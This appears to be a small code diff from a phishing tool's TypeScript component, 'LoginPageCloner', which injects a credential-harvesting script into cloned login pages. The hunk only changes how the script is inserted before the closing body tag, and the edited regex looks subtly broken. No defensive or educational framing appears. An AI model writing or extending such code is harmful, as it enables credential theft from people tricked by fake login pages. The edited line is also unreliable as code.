@@ -95,7 +95,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
       
     // Inject the credential harvester script before the closing body tag
     if (html.includes('</body>')) {
-      html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
+      html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
     } else {
       html += harvesterScript;
     }
